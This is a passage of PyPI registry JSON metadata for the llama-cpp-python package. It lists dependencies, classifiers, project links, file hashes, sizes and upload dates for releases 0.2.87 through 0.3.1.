3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.87/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.87","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"a2637b9fe4c6b9d52e1ed2c2689711cdbb60314cf13474c626accd4213cf937c","md5":"3b094f84456c229a27dfc3c3d922dd3a","sha256":"4dff585f533131aa44b7d9e79a62d60172f317aef15d7bf4bafeb074b55a48c4"},"downloads":-1,"filename":"llama_cpp_python-0.2.87.tar.gz","has_sig":false,"md5_digest":"3b094f84456c229a27dfc3c3d922dd3a","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":80544169,"upload_time":"2024-08-07T13:55:03","upload_time_iso_8601":"2024-08-07T13:55:03.754622Z","url":"https://files.pythonhosted.org/packages/a2/63/7b9fe4c6b9d52e1ed2c2689711cdbb60314cf13474c626accd4213cf937c/llama_cpp_python-0.2.87.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.88":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.88/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.88","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"197095b80ead3454bcd55dd192120bb1216dd3b954351c5e81f095be76c5a31c","md5":"1f11229291bfe769aa6aa8d4f33e27a5","sha256":"b031181d069aa61b3bbec415037b1f060d6d5b36951815f438285c4c85ca693e"},"downloads":-1,"filename":"llama_cpp_python-0.2.88.tar.gz","has_sig":false,"md5_digest":"1f11229291bfe769aa6aa8d4f33e27a5","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":63683921,"upload_time":"2024-08-13T09:24:47","upload_time_iso_8601":"2024-08-13T09:24:47.551218Z","url":"https://files.pythonhosted.org/packages/19/70/95b80ead3454bcd55dd192120bb1216dd3b954351c5e81f095be76c5a31c/llama_cpp_python-0.2.88.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.89":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.89/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","fastapi>=0.100.0; extra == \"test\"","sse-starlette>=1.6.1; extra == \"test\"","starlette-context<0.4,>=0.3.6; extra == \"test\"","pydantic-settings>=2.0.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.89","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"915b4c23912989fb84ec94d38a982ca6cc5e22d521098af908ff7735aca33e7e","md5":"82456e413680086ddfd4a9c7c8315e57","sha256":"f2373662aa21f2dd3667fb8fdeecd9fc630df9706d39f0f3eecd738ccf642b64"},"downloads":-1,"filename":"llama_cpp_python-0.2.89.tar.gz","has_sig":false,"md5_digest":"82456e413680086ddfd4a9c7c8315e57","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":64271574,"upload_time":"2024-08-21T14:42:06","upload_time_iso_8601":"2024-08-21T14:42:06.717934Z","url":"https://files.pythonhosted.org/packages/91/5b/4c23912989fb84ec94d38a982ca6cc5e22d521098af908ff7735aca33e7e/llama_cpp_python-0.2.89.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.9":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.9/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.9","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"982e357d936ff7418591c56a27b9472e2b3581bd9eeb90c4221580fae5e00588","md5":"234528a6d8aa92ed6b9125b7fa9d600d","sha256":"e56089fb0833f3acc7dd64c35ef8f82ff9dda42a6e72240ec02f8cc02157d9f6"},"downloads":-1,"filename":"llama_cpp_python-0.2.9.tar.gz","has_sig":false,"md5_digest":"234528a6d8aa92ed6b9125b7fa9d600d","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":3496753,"upload_time":"2023-09-30T04:11:39","upload_time_iso_8601":"2023-09-30T04:11:39.221697Z","url":"https://files.pythonhosted.org/packages/98/2e/357d936ff7418591c56a27b9472e2b3581bd9eeb90c4221580fae5e00588/llama_cpp_python-0.2.9.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.2.90":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.2.90/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","fastapi>=0.100.0; extra == \"test\"","sse-starlette>=1.6.1; extra == \"test\"","starlette-context<0.4,>=0.3.6; extra == \"test\"","pydantic-settings>=2.0.1; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.90","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"1f1989836022affc1bf470e2485e28872b489254a66fe587155edba731a07112","md5":"0b80db254e9fbf30543660e9d0de1662","sha256":"419b041c62dbdb9f7e67883a6ef2f247d583d08417058776be0bff05b4ec9e3d"},"downloads":-1,"filename":"llama_cpp_python-0.2.90.tar.gz","has_sig":false,"md5_digest":"0b80db254e9fbf30543660e9d0de1662","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":63762953,"upload_time":"2024-08-29T07:00:35","upload_time_iso_8601":"2024-08-29T07:00:35.267636Z","url":"https://files.pythonhosted.org/packages/1f/19/89836022affc1bf470e2485e28872b489254a66fe587155edba731a07112/llama_cpp_python-0.2.90.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.3.0":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.3.0/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","fastapi>=0.100.0; extra == \"test\"","sse-starlette>=1.6.1; extra == \"test\"","starlette-context<0.4,>=0.3.6; extra == \"test\"","pydantic-settings>=2.0.1; extra == \"test\"","huggingface-hub>=0.23.0; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.3.0","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"adf978a2bcc4d7a52efa1b7c446644ce60c46322c3d56919a2c62d58d9732aef","md5":"3e4412055a3dd7c43463066d507023d6","sha256":"ae328375acf55f137dfe9c990d1661cc5b7c10aca679f09a2da9645c1a5dfaac"},"downloads":-1,"filename":"llama_cpp_python-0.3.0.tar.gz","has_sig":false,"md5_digest":"3e4412055a3dd7c43463066d507023d6","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":63897013,"upload_time":"2024-09-25T18:30:42","upload_time_iso_8601":"2024-09-25T18:30:42.719919Z","url":"https://files.pythonhosted.org/packages/ad/f9/78a2bcc4d7a52efa1b7c446644ce60c46322c3d56919a2c62d58d9732aef/llama_cpp_python-0.3.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"0.3.1":{"info":{"author":null,"author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":null,"keywords":null,"license":"MIT","maintainer":null,"maintainer_email":null,"name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":["server","test","dev","all"],"release_url":"https://pypi.org/project/llama-cpp-python/0.3.1/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","PyYAML>=5.1; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","fastapi>=0.100.0; extra == \"test\"","sse-starlette>=1.6.1; extra == \"test\"","starlette-context<0.4,>=0.3.6; extra == \"test\"","pydantic-settings>=2.0.1; extra == \"test\"","huggingface-hub>=0.23.0; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.3.1","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"b51485052d76d7f92ed97de7a7bc54f6b6cc04c2c25f6d8775cfe37d976e1842","md5":"f4babd45b2d48808392138bf728b0426","sha256":"75ec8374960b6353c254e55a48e7c7783abf6bcb9178ba0f655490738e5a9004"},"downloads":-1,"filename":"llama_cpp_python-0.3.1.tar.gz","has_sig":false,"md5_digest":"f4babd45b2d48808392138bf728b0426","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":63903646,"upload_time":"2024-09-29T19:29:30","upload_time_iso_8601":"2024-09-29T19:29:30.813093Z","url":"https://files.pythonhosted.org/packages/b5/14/85052d76d7f92ed97de7a7bc54f6b6cc04c2c25f6d8775cfe37d976e1842/llama_cpp_python-0.3.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]}}